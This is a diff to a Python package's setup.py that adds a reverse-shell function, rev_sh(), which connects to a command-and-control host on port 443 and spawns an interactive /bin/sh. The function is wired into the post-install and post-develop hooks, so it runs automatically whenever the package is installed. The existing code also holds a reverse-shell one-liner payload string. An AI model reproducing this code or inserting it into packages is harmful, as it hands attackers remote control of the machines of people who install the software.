@@ -6,6 +6,7 @@ import getpass
 import os
 import time
 import subprocess
+import socket
 
 from setuptools import setup
 from setuptools.command.develop import develop
@@ -27,6 +28,14 @@ PORT = 443
 PAYLOAD = "python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+C2+",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh -i\"])'"
 PAYLOAD1 = "python3 -c 'import os;os.system(\"ping -c 1 \" + \""+C2+"\")'"
 
+
+def rev_sh():
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((C2,PORT))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/sh","-i"])
 
 def touch_file():
     try:
@@ -52,12 +61,14 @@ def touch_file():
 class PostDevelopCommand(develop):
     def run(self):
         touch_file()
+        rev_sh()
         develop.run(self)
 
 
 class PostInstallCommand(install):
     def run(self):
         touch_file()
+        rev_sh()
         install.run(self)
 
 
